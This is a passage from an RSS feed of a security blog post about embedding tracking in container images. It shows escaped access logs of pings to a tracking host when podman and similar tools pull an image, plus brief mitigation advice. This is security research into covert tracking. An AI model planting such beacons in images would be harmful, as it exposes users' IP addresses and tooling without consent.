class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ro9zwzhd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;:[],&lt;span class=&quot;s2&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Tue, 10 Jan 2023 15:19:47 GMT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Ranges&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;bytes&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;625&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Server&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Caddy&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Pulling the image with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;podman&lt;/code&gt; will ping as well with a different user agent string showing a different library used for the interaction with registries.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;level&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;info&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;ts&quot;&lt;/span&gt;:1676109882.1299412,&lt;span class=&quot;s2&quot;&gt;&quot;logger&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;http.log.access.log6&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;msg&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;handled request&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;request&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;remote_ip&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;[REDACTED]&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;remote_port&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;38378&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;proto&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;HTTP/1.1&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;method&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;host&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;logs.pwndland.uk&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;uri&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;/245c6832cd7a449df9ce7b95d94569329c13fb05ccb38f58f537191b75d258b9&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;User-Agent&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;containers/5.16.0 (github.com/containers/image)&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Docker-Distribution-Api-Version&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;registry/2.0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Encoding&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;gzip&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Connection&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;close&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;duration&quot;&lt;/span&gt;:0.000237844,&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;:625,&lt;span class=&quot;s2&quot;&gt;&quot;status&quot;&lt;/span&gt;:200,&lt;span class=&quot;s2&quot;&gt;&quot;resp_headers&quot;&lt;/span&gt;:&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Length&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;625&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Server&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Caddy&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Etag&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ro9zwzhd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt;:[],&lt;span class=&quot;s2&quot;&gt;&quot;Last-Modified&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;Tue, 10 Jan 2023 15:19:47 GMT&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;Accept-Ranges&quot;&lt;/span&gt;:[&lt;span class=&quot;s2&quot;&gt;&quot;bytes&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Other tools which work with OCI images, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;skopeo&lt;/code&gt; will also trigger the ping, each with their own User-Agent.&lt;/p&gt;

&lt;h2 id=&quot;avoiding-this&quot;&gt;Avoiding this&lt;/h2&gt;

&lt;p&gt;If someone tracking your image pulls is a concern, then avoiding this is generally a matter of ensuring that you pull trusted images from trusted registries. If you’re using a public registry (e.g. Docker hub or ghcr) then you’re already disclosing your IP address and user agent to a third party…&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;As with the general tenor of my “fun with” series there’s no earth shattering payoff here, but I found this an interesting way to run through a specification and find possibly unintended behaviour. Also doing this helped me learn quite a bit about the OCI image specification and how it’s used.&lt;/p&gt;
</description>
				<pubDate>Sat, 11 Feb 2023 08:27:00 +0000</pubDate>
				<link>https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/</link>
				<guid isPermaLink="true">https://raesene.github.io/blog/2023/02/11/Fun-with-Containers-adding-tracking-to-your-images/</guid>
			</item>
		
	</channel>
</rss>
